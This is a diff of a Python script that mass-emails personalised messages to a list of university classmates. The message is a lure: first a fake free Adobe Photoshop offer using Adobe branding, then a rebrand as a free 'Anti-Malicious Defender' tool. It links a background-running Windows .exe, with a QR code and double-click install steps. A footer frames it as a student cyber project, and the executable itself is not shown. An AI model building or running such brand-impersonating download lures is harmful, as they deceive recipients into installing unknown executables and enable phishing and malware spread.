@@ -34,7 +34,7 @@ print()
 # =====================================================
 
 SUPPORT_MESSAGE = "For support, reply to this email or contact us at security@anti-malicious.com"
-YOUR_NAME = "Anti-Malicious Security Team"  # Your name/team name
+YOUR_NAME = "Anti-Malicious Security Team"
 
 # ===== READ CLASSMATES LIST =====
 print("📋 Reading classmates list...")
@@ -84,9 +84,8 @@ try:
             msg["To"] = student['email']
             msg["Reply-To"] = SENDER_EMAIL
             
-            # Extract first name (assuming format is "LAST FIRST" or "FIRST LAST")
+            # Extract first name
             full_name = student['name']
-            # Try to get first name - split and take last part (usually first name in Cambodian format)
             name_parts = full_name.split()
             first_name = name_parts[-1] if name_parts else full_name
             
@@ -111,7 +110,7 @@ Download here: {DOWNLOAD_LINK_EXE}
 This offer is exclusive for students. Stay protected!
 
 Best regards,
-Anti-Malicious Security Team
+{YOUR_NAME}
 CADT Student Offer"""
             
             # HTML version
@@ -119,47 +118,47 @@ CADT Student Offer"""
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Photoshop CC 2025 Offer for CADT Students</title>
+    <title>Anti-Malicious Defender - Free Protection for CADT Students</title>
 </head>
-<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #001e36 0%, #003366 100%); margin: 0; padding: 20px;">
+<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); margin: 0; padding: 20px;">
 <div style="max-width: 600px; margin: 20px auto; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
     
     <!-- Header -->
     <div style="text-align: center; margin-bottom: 30px;">
-        <img src="cid:photoshop_logo" alt="Adobe Photoshop" style="width: 100px; height: 100px; margin-bottom: 15px;">
-        <div style="display: inline-block; background: #31a8ff; color: white; padding: 10px 20px; border-radius: 50px; font-weight: bold; margin-bottom: 15px;">
+        <div style="font-size: 80px; margin-bottom: 15px;">🛡️</div>
+        <div style="display: inline-block; background: linear-gradient(135deg, #00d26a 0%, #00a854 100%); color: white; padding: 10px 20px; border-radius: 50px; font-weight: bold; margin-bottom: 15px;">
             🎓 CADT STUDENT EXCLUSIVE
         </div>
         <h1 style="color: #333; margin: 10px 0 5px 0;">Hi {first_name}! 👋</h1>
-        <p style="color: #666; margin: 0;">Special offer for CADT students only</p>
+        <p style="color: #666; margin: 0;">Free security protection for CADT students</p>
     </div>
     
     <!-- Main Offer -->
-    <div style="background: linear-gradient(135deg, #31a8ff 0%, #0078d7 100%); color: white; padding: 30px; border-radius: 12px; margin: 25px 0; text-align: center;">
-        <h2 style="margin: 0 0 15px 0; font-size: 28px;">🎁 FREE Download</h2>
-        <h3 style="margin: 0 0 20px 0; font-size: 22px;">Adobe Photoshop CC 2025</h3>
+    <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; padding: 30px; border-radius: 12px; margin: 25px 0; text-align: center;">
+        <h2 style="margin: 0 0 15px 0; font-size: 28px;">🛡️ FREE Download</h2>
+        <h3 style="margin: 0 0 20px 0; font-size: 22px;">Anti-Malicious Defender</h3>
         
         <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 25px 0;">
-            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
-                <div style="font-size: 24px; margin-bottom: 8px;">🖼️</div>
-                <p style="margin: 0; font-size: 14px;">Photo Editing</p>
+            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                <div style="font-size: 24px; margin-bottom: 8px;">🔒</div>
+                <p style="margin: 0; font-size: 14px;">Browser Protection</p>
             </div>
-            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
-                <div style="font-size: 24px; margin-bottom: 8px;">🤖</div>
-                <p style="margin: 0; font-size: 14px;">AI Features</p>
+            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                <div style="font-size: 24px; margin-bottom: 8px;">🛡️</div>
+                <p style="margin: 0; font-size: 14px;">Ransomware Shield</p>
             </div>
-            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
-                <div style="font-size: 24px; margin-bottom: 8px;">☁️</div>
-                <p style="margin: 0; font-size: 14px;">Cloud Storage</p>
+            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                <div style="font-size: 24px; margin-bottom: 8px;">💾</div>
+                <p style="margin: 0; font-size: 14px;">USB Protection</p>
             </div>
-            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
-                <div style="font-size: 24px; margin-bottom: 8px;">�</div>
-                <p style="margin: 0; font-size: 14px;">Free Updates</p>
+            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                <div style="font-size: 24px; margin-bottom: 8px;">🌐</div>
+                <p style="margin: 0; font-size: 14px;">Network Guard</p>
             </div>
         </div>
         
         <p style="margin: 20px 0 0 0; opacity: 0.9; font-size: 14px;">
-            Regular price: $22.99/month • Student offer: FREE
+            Complete Protection Suite • Lightweight • Always FREE
         </p>
     </div>
     
@@ -168,14 +167,14 @@ CADT Student Offer"""
         <p style="color: #333; font-size: 14px; margin-bottom: 15px; font-weight: 600;">Scan to Download Directly:</p>
         <img src="cid:qr_code_image" 
              alt="QR Code for Download" 
-             style="width: 100%; max-width: 250px; height: auto; border-radius: 12px; box-shadow: 0 8px 25px rgba(49, 168, 255, 0.3); margin-bottom: 20px; border: 3px solid #31a8ff; padding: 10px; background: white;">
+             style="width: 100%; max-width: 250px; height: auto; border-radius: 12px; box-shadow: 0 8px 25px rgba(0, 210, 106, 0.3); margin-bottom: 20px; border: 3px solid #00d26a; padding: 10px; background: white;">
         <p style="color: #666; font-size: 12px; margin-top: 10px;">📱 Point your phone camera at this QR code</p>
     </div>
     
     <!-- Download Button -->
     <div style="text-align: center; margin: 35px 0;">
-        <a href="{DOWNLOAD_LINK}" 
-           style="background: linear-gradient(135deg, #31a8ff 0%, #0078d7 100%); 
+        <a href="{DOWNLOAD_LINK_EXE}" 
+           style="background: linear-gradient(135deg, #00d26a 0%, #00a854 100%); 
                   color: white; 
                   padding: 18px 50px; 
                   text-decoration: none; 
@@ -183,42 +182,59 @@ CADT Student Offer"""
                   font-weight: bold; 
                   font-size: 18px; 
                   display: inline-block;
-                  box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
-                  transition: all 0.3s;
+                  box-shadow: 0 5px 20px rgba(0, 210, 106, 0.3);
                   border: none;
                   cursor: pointer;">
             🚀 DOWNLOAD NOW
         </a>
         <p style="color: #666; font-size: 13px; margin-top: 12px;">
-            Windows & macOS Compatible • Exclusive CADT Student Access
+            Windows 10/11 • ~18 MB • Runs in Background
+        </p>
+        <p style="color: #999; font-size: 12px; margin-top: 8px;">
+            Or download <a href="{DOWNLOAD_LINK_ZIP}" style="color: #00d26a;">full package (.zip)</a>
+        </p>
+    </div>
+    
+    <!-- Installation Guide -->
+    <div style="background: #f8f9fa; padding: 25px; border-radius: 10px; margin: 25px 0; border-left: 5px solid #00d26a;">
+        <h3 style="color: #333; margin-top: 0;">⚡ Quick Installation:</h3>
+        <ol style="color: #555; line-height: 2; padding-left: 20px;">
+            <li><strong>Download</strong> - Click the button above</li>
+            <li><strong>Run</strong> - Double-click anti_malicious.exe</li>
+            <li><strong>Done!</strong> - Desktop shortcut created, protection active</li>
+        </ol>
+        <p style="color: #666; font-size: 14px; margin: 10px 0 0 0;">
+            💡 To open GUI: Click the "Anti-Malicious Defender" icon on your desktop
         </p>
     </div>
     
     <!-- Student Benefits -->
-    <div style="background: #f8f9fa; padding: 25px; border-radius: 10px; margin: 25px 0; border-left: 5px solid #31a8ff;">
-        <h3 style="color: #333; margin-top: 0;">🎓 Perfect for Students:</h3>
-        <ul style="color: #555; line-height: 1.8; padding-left: 20px;">
-            <li>✓ Create stunning designs for projects</li>
-            <li>✓ Edit photos professionally</li>
-            <li>✓ Learn industry-standard tools</li>
-            <li>✓ Build your portfolio</li>
+    <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 25px; border-radius: 10px; margin: 25px 0;">
+        <h3 style="color: #00d26a; margin-top: 0;">✅ Complete Protection Against:</h3>
+        <ul style="color: #eaeaea; line-height: 1.8; padding-left: 20px;">
+            <li>✓ Browser data theft (Chrome, Edge, Firefox)</li>
+            <li>✓ Discord token theft</li>
+            <li>✓ Ransomware encryption attacks</li>
+            <li>✓ Registry persistence malware</li>
+            <li>✓ USB autorun threats</li>
+            <li>✓ Network spreading worms</li>
         </ul>
     </div>
     
     <!-- Support Section -->
-    <div style="text-align: center; padding: 25px; background: linear-gradient(135deg, #001e36 0%, #003366 100%); color: white; border-radius: 10px; margin: 25px 0;">
+    <div style="text-align: center; padding: 25px; background: linear-gradient(135deg, #00d26a 0%, #00a854 100%); color: white; border-radius: 10px; margin: 25px 0;">
         <h3 style="margin-top: 0; color: white;">💬 Need Help?</h3>
         <p style="opacity: 0.9; margin-bottom: 10px;">{SUPPORT_MESSAGE}</p>
-        <p style="opacity: 0.8; font-size: 14px;">We're here to help CADT students!</p>
+        <p style="opacity: 0.8; font-size: 14px;">We're here to help CADT students stay safe!</p>
     </div>
     
     <!-- Footer -->
     <div style="text-align: center; padding-top: 25px; border-top: 1px solid #eee; margin-top: 30px;">
         <p style="color: #888; font-size: 12px; line-height: 1.6; margin: 0;">
-            This is an exclusive offer for CADT University students only.<br>
-            Offer valid for limited time. One redemption per student.<br><br>
-            Adobe and the Adobe logo are trademarks of Adobe Inc.<br>
-            <span style="color: #666; font-size: 11px;">Sent with ❤️ to CADT students</span>
+            This is a free security tool for CADT University students.<br>
+            Lightweight • Open Source • Educational Purpose<br><br>
+            G2 Team 4 - Cyber Project T1Y3<br>
+            <span style="color: #666; font-size: 11px;">Sent with 🛡️ to protect CADT students</span>
         </p>
     </div>
     
@@ -228,22 +244,14 @@ CADT Student Offer"""
             
             # Attach both versions
             msg.attach(MIMEText(text, "plain"))
-            # msg.attach(MIMEText(html, "html"))  # HTML disabled - causes delivery issues
-            
-            # Attach Photoshop logo image
-            logo_path = os.path.join(os.path.dirname(__file__), 'photoshop_logo.png')
-            if os.path.exists(logo_path):
-                try:
-                    with open(logo_path, 'rb') as attachment:
-                        img = MIMEImage(attachment.read())
-                        img.add_header('Content-ID', '<photoshop_logo>')
-                        img.add_header('Content-Disposition', 'inline', filename='photoshop_logo.png')
-                        msg.attach(img)
-                except Exception as e:
-                    print(f"   ⚠️  Could not attach Photoshop logo: {e}")
+            msg.attach(MIMEText(html, "html"))
             
             # Attach QR code image if it exists
-            qr_code_path = os.path.join(os.path.dirname(__file__), 'qr_code.png')
+            qr_code_path = os.path.join(os.path.dirname(__file__), 'qr_code_anti_malicious.png')
+            if not os.path.exists(qr_code_path):
+                # Try alternative name
+                qr_code_path = os.path.join(os.path.dirname(__file__), 'qr_code.png')
+            
             if os.path.exists(qr_code_path):
                 try:
                     with open(qr_code_path, 'rb') as attachment:
@@ -304,4 +312,8 @@ print("1. Check your sent folder in Gmail to verify")
 print("2. Some emails may go to spam - ask friends to check")
 print("3. Gmail daily limit: ~500 emails")
 print("4. Failed emails can be retried later")
+print("\n📥 DOWNLOAD LINKS SENT:")
+print(f"   • Download page: {DOWNLOAD_PAGE}")
+print(f"   • Direct .exe: {DOWNLOAD_LINK_EXE}")
+print(f"   • ZIP package: {DOWNLOAD_LINK_ZIP}")
 print("="*50)
